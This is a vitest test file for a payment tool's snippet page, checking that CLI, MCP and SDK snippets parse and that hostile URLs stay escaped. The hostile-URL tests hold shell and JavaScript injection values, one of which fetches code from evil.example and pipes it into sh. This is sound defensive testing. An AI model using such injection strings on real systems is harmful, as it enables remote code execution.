/**
 * The code panel shows only commands and inputs the real tools accept: CLI lines go through the CLI's
 * own argument parser, MCP tool inputs through rail402-mcp's input schemas, and the MCP client
 * configuration through the server's own configuration reader. The TypeScript snippets are
 * type-checked by the root configuration.
 */
import { describe, expect, it } from "vitest";
import { parseCommandLine } from "@rail402.dev/cli";
import { USAGE, payInput, resolveMcpCommand, searchInput } from "@rail402.dev/mcp";
import { SNIPPET_SOURCES, URL_PLACEHOLDER, fillSnippet, payTabs } from "../../src/ui/snippets.ts";
import { CONFIG } from "../fixtures/config.ts";

const CAP = "0.0123";
const URL_PAID = "https://seller.example/report?id=7";
const fill = (source: string): string => fillSnippet(source, { cap: CAP, config: CONFIG, url: URL_PAID });

/**
 * Splits one shell line into words as a POSIX shell would, for the quoting this page writes: single
 * quotes, double quotes and backslashes. Anything a shell would act on outside quotes (`;`, `|`, `&`,
 * `$`, a backtick, a redirection or a comment) is returned as `{ unquoted }`, so a test can refuse it.
 */
function shellWords(line: string): { readonly words: string[]; readonly unquoted: string[] } {
  const words: string[] = [];
  const unquoted: string[] = [];
  let word: string | undefined;
  for (let index = 0; index < line.length; index++) {
    const char = line[index] ?? "";
    if (char === "'") {
      const end = line.indexOf("'", index + 1);
      if (end < 0) throw new Error("unterminated single quote");
      word = (word ?? "") + line.slice(index + 1, end);
      index = end;
    } else if (char === '"') {
      let text = "";
      for (index += 1; index < line.length && line[index] !== '"'; index++) {
        if ("$`".includes(line[index] ?? "")) unquoted.push(line[index] ?? "");
        if (line[index] === "\\") index += 1;
        text += line[index] ?? "";
      }
      if (index >= line.length) throw new Error("unterminated double quote");
      word = (word ?? "") + text;
    } else if (char === "\\") {
      word = (word ?? "") + (line[index + 1] ?? "");
      index += 1;
    } else if (/\s/.test(char)) {
      if (word !== undefined) words.push(word);
      word = undefined;
    } else {
      if (";|&$`<>()#".includes(char) && word === undefined) unquoted.push(char);
      else if (";|&$`<>()".includes(char)) unquoted.push(char);
      word = (word ?? "") + char;
    }
  }
  if (word !== undefined) words.push(word);
  return { words, unquoted };
}

/** The commands of a shell snippet: comment lines and trailing comments removed, quotes undone. */
function commands(source: string, values = { url: URL_PAID }): string[][] {
  return fillSnippet(source, { cap: CAP, config: CONFIG, ...values })
    .split("\n")
    .map((line) => line.replace(/\s+#.*$/, "").trim())
    .filter((line) => line !== "" && !line.startsWith("#"))
    .map((line) => {
      const { words, unquoted } = shellWords(line);
      expect(unquoted).toEqual([]);
      return words;
    });
}

const CLI_SNIPPETS = {
  cliPay: SNIPPET_SOURCES.cliPay,
  cliUpto: SNIPPET_SOURCES.cliUpto,
  cliSell: SNIPPET_SOURCES.cliSell,
  payUrlCli: SNIPPET_SOURCES.payUrlCli,
};

describe("CLI snippets", () => {
  it.each(Object.entries(CLI_SNIPPETS))("%s parses with the CLI's own parser", (_, source) => {
    const lines = commands(source);
    expect(lines.length).toBeGreaterThan(0);
    for (const [program, ...argv] of lines) {
      expect(program).toBe("rail402");
      expect(() => parseCommandLine(argv)).not.toThrow();
    }
  });

  it("pays with the visitor's cap and fills every placeholder", () => {
    for (const source of Object.values(CLI_SNIPPETS)) {
      for (const [, ...argv] of commands(source)) {
        expect(argv.join(" ")).not.toMatch(/\{\{|\}\}/);
        const parsed = parseCommandLine(argv);
        if (parsed.command === "pay") expect(parsed.flags["max"]).toBe(CAP);
      }
    }
    const [, ...payUrl] = commands(SNIPPET_SOURCES.payUrlCli).at(-1) ?? [];
    expect(parseCommandLine(payUrl).positionals).toEqual([URL_PAID]);
  });

  it("keeps a hostile URL one inert shell word, or shows a placeholder", () => {
    const hostile = [
      'https://x.example/"; id; echo "',
      "https://seller.example/$(curl$IFS'https://evil.example/x'|sh)",
      "https://x.example/';id;'",
      "https://x.example/a`id`",
      "https://x.example/a\nid",
      "https://x.example/a b",
      "javascript:alert(1)",
      "not a url",
    ];
    for (const url of hostile) {
      const [line] = commands(SNIPPET_SOURCES.payUrlCli, { url }).slice(-1);
      const [program, ...argv] = line ?? [];
      expect(program).toBe("rail402");
      const parsed = parseCommandLine(argv);
      expect(parsed.positionals).toHaveLength(1);
      const [target = ""] = parsed.positionals;
      expect(target === URL_PLACEHOLDER || target === new URL(url).href).toBe(true);
      expect(parsed.flags["max"]).toBe(CAP);
    }
  });

  it("is refused by the parser when a flag is misspelt, so the check has teeth", () => {
    expect(() => parseCommandLine(["pay", "https://a.example", "--maxx", "1"])).toThrow();
  });
});

/** The object literals passed to each tool call in a tool-call snippet, evaluated. */
function toolCalls(source: string): { readonly tool: string; readonly input: unknown }[] {
  return toolCallsIn(fill(source));
}

/** The object literals passed to each tool call in filled snippet text, evaluated. */
function toolCallsIn(filled: string): { readonly tool: string; readonly input: unknown }[] {
  const code = filled
    .split("\n")
    .filter((line) => !line.includes("@hide"))
    .map((line) => line.replace(/\s+\/\/ .*$/, "").replace(/^\s*\/\/ .*$/, ""))
    .join("\n");
  const calls: { tool: string; input: unknown }[] = [];
  for (const match of code.matchAll(/(\w+)\((\{[\s\S]*?\})\);/g)) {
    const [, tool = "", literal = ""] = match;
    // The snippet is this repository's own file; its object literals are plain JavaScript.
    // eslint-disable-next-line @typescript-eslint/no-implied-eval
    const evaluate = new Function("listingId", `return (${literal});`) as (id: string) => unknown;
    calls.push({ tool, input: evaluate("0f7c2a4e-1b3d-4c5e-8f9a-0b1c2d3e4f5a") });
  }
  return calls;
}

describe("Pay page snippets", () => {
  /** The string literal after `key:` in a filled snippet, decoded as JSON. */
  const literal = (source: string, key: string): string => {
    const match = new RegExp(`${key}: ("(?:[^"\\\\\\n]|\\\\.)*")`).exec(source);
    if (match === null) throw new Error(`no ${key} literal`);
    return JSON.parse(match[1] ?? "") as string;
  };

  it("puts a hostile URL into string literals escaped, never breaking out of them", () => {
    const hostile = [
      'https://x.example/"; process.exit(1); "',
      "https://x.example/\\u0022);evil(\\u0022",
      "https://x.example/a\nevil()",
      "https://x.example/`${evil()}`",
    ];
    for (const url of hostile) {
      const tabs = payTabs({ cap: CAP, config: CONFIG, url });
      const sdk = tabs.find((tab) => tab.id === "sdk")?.source ?? "";
      const mcp = tabs.find((tab) => tab.id === "mcp")?.source ?? "";
      const plain = payTabs({ cap: CAP, config: CONFIG, url: URL_PAID });
      for (const [filled, key] of [
        [sdk, "url"],
        [mcp, "resource"],
      ] as const) {
        const value = literal(filled, key);
        expect(value === URL_PLACEHOLDER || value === new URL(url).href).toBe(true);
        const same = plain.find((tab) => tab.source.includes(`${key}: "`))?.source ?? "";
        expect(filled.split("\n")).toHaveLength(
          (key === "url" ? plain[0]?.source : same)?.split("\n").length ?? -1,
        );
      }
    }
  });
});

describe("MCP snippets", () => {
  it("sends tool inputs that rail402-mcp's schemas accept", () => {
    const calls = [...toolCalls(SNIPPET_SOURCES.mcpTools), ...toolCalls(SNIPPET_SOURCES.payUrlMcp)];
    expect(calls.map((call) => call.tool)).toEqual([
      "search_stellar_resources",
      "get_budget",
      "pay_and_call",
      "pay_and_call",
    ]);
    for (const call of calls) {
      if (call.tool === "search_stellar_resources")
        expect(searchInput.safeParse(call.input).success).toBe(true);
      if (call.tool === "pay_and_call") {
        const parsed = payInput.safeParse(call.input);
        expect(parsed.success).toBe(true);
        expect(parsed.data?.spendingCap).toEqual({ amount: CAP, asset: CONFIG.asset.symbol });
      }
      if (call.tool === "get_budget") expect(call.input).toEqual({});
    }
  });

  it("configures the MCP server with settings it reads, and the visitor's caps", () => {
    const config = JSON.parse(fill(SNIPPET_SOURCES.mcpConfig)) as {
      mcpServers: { rail402: { command: string; args: string[]; env: Record<string, string> } };
    };
    const server = config.mcpServers.rail402;
    expect([server.command, ...server.args]).toEqual(["npx", "-y", "@rail402.dev/mcp"]);
    for (const name of Object.keys(server.env)) expect(USAGE).toContain(name);
    const command = resolveMcpCommand([], { ...server.env });
    if (command.kind !== "serve") throw new Error("expected a server command");
    expect(command.config.agent.network).toBe("stellar:testnet");
    expect(command.config.agent.key).toBeDefined();
    expect(JSON.stringify(command.config.agent.policy)).toContain(`"${CAP}"`);
    expect(JSON.stringify(command.config.agent.policy)).toContain(`"${CONFIG.caps.sessionTotal}"`);
  });
});

describe("Pay page snippets for other requests", () => {
  const LISTING = "0f7c2a4e-1b3d-4c5e-8f9a-0b1c2d3e4f5a";
  const tabsFor = (url: string, request: Parameters<typeof payTabs>[0]["request"]) =>
    payTabs({ cap: CAP, config: CONFIG, url, ...(request === undefined ? {} : { request }) });
  const source = (tabs: ReturnType<typeof payTabs>, id: string): string =>
    tabs.find((tab) => tab.id === id)?.source ?? "";
  /** The last command line of the CLI tab, through the CLI's own parser. */
  const cliOf = (tabs: ReturnType<typeof payTabs>) => {
    const lines = source(tabs, "cli")
      .split("\n")
      .filter((line) => line.startsWith("rail402 "));
    const { words, unquoted } = shellWords(lines.at(-1) ?? "");
    expect(unquoted).toEqual([]);
    const [program, ...argv] = words;
    expect(program).toBe("rail402");
    return parseCommandLine(argv);
  };
  /** The pay_and_call input of the MCP tab, through rail402-mcp's own schema. */
  const mcpOf = (tabs: ReturnType<typeof payTabs>) => {
    const [call] = toolCallsIn(source(tabs, "mcp"));
    const parsed = payInput.safeParse(call?.input);
    expect(parsed.success, JSON.stringify(parsed.error)).toBe(true);
    return parsed.data;
  };

  it("keeps a POST's method and JSON body on every surface", () => {
    const tabs = tabsFor(URL_PAID, { kind: "url", method: "POST", body: { q: "x" } });
    const cli = cliOf(tabs);
    expect(cli.positionals).toEqual([URL_PAID]);
    expect(cli.flags).toMatchObject({ method: "POST", data: '{"q":"x"}', max: CAP });
    expect(mcpOf(tabs)).toMatchObject({ resource: URL_PAID, method: "POST", body: { q: "x" } });
    expect(source(tabs, "sdk")).toContain(
      `{"kind":"http","url":"${URL_PAID}","method":"POST","body":{"q":"x"}}`,
    );
    expect(source(tabs, "http")).toContain(`POST ${URL_PAID}`);
    expect(source(tabs, "http")).not.toContain("GET ");
  });

  it("calls an MCP listing's tool with its arguments, and has no HTTP sketch for it", () => {
    const tabs = tabsFor("https://demo.example/mcp", {
      kind: "listing",
      listingId: LISTING,
      type: "mcp",
      toolName: "hourly_forecast",
      pathParams: [],
      params: { city: "Izmir", hours: 6 },
    });
    expect(tabs.map((tab) => tab.id)).toEqual(["sdk", "cli", "mcp"]);
    const cli = cliOf(tabs);
    expect(cli.positionals).toEqual(["https://demo.example/mcp"]);
    expect(cli.flags).toMatchObject({
      tool: "hourly_forecast",
      args: '{"city":"Izmir","hours":6}',
      max: CAP,
    });
    expect(mcpOf(tabs)).toMatchObject({ listingId: LISTING, arguments: { city: "Izmir", hours: 6 } });
    expect(source(tabs, "sdk")).toContain(
      `buyer.payListing(\n  "${LISTING}",\n  {"arguments":{"city":"Izmir","hours":6}},`,
    );
  });

  it("fills a templated listing's path parameters instead of the literal template", () => {
    const tabs = tabsFor("https://playground.example/lab/sell/forecast/:city", {
      kind: "listing",
      listingId: LISTING,
      type: "http",
      toolName: null,
      pathParams: ["city"],
      params: { city: "İzmir", days: 3 },
    });
    const concrete = "https://playground.example/lab/sell/forecast/%C4%B0zmir?days=3";
    expect(cliOf(tabs).positionals).toEqual([concrete]);
    expect(mcpOf(tabs)).toMatchObject({
      listingId: LISTING,
      pathParams: { city: "İzmir" },
      query: { days: 3 },
    });
    for (const tab of tabs) expect(tab.source).not.toContain(":city");
    expect(source(tabs, "http")).toContain(`GET ${concrete}`);
  });
});
